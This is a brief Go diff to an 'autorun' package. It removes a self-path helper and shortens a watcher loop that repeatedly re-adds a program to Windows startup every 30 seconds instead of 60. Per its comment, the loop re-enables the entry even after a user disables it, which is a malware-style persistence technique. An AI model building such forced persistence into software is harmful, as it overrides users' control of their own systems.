@@ -1,32 +1,10 @@
 package autorun
 
 import (
-	"os"
-	"path/filepath"
 	"time"
 	
 	"golang.org/x/sys/windows/registry"
 )
-
-// retrieves the absolute path to the current executable
-func GetSelfDir() (string, error) {
-	dir, err := os.Executable()
-	if err != nil {
-		return "", err
-	}
-
-	dir, err = filepath.EvalSymlinks(dir)
-	if err != nil {
-		return "", err
-	}
-
-	dir, err = filepath.Abs(dir)
-	if err != nil {
-		return "", err
-	}
-
-	return dir, nil
-}
 
 // adds a 'dir' file to startup; if disabled in startup, enables it
 func AddToAutorun(dir string, name string) error {
@@ -96,7 +74,7 @@ func StartWatcher(dir string, name string) {
 	go func() {
 		for {
 			_ = AddToAutorun(dir, name)
-			time.Sleep(60 * time.Second)
+			time.Sleep(30 * time.Second)
 		}
 	}()
 }
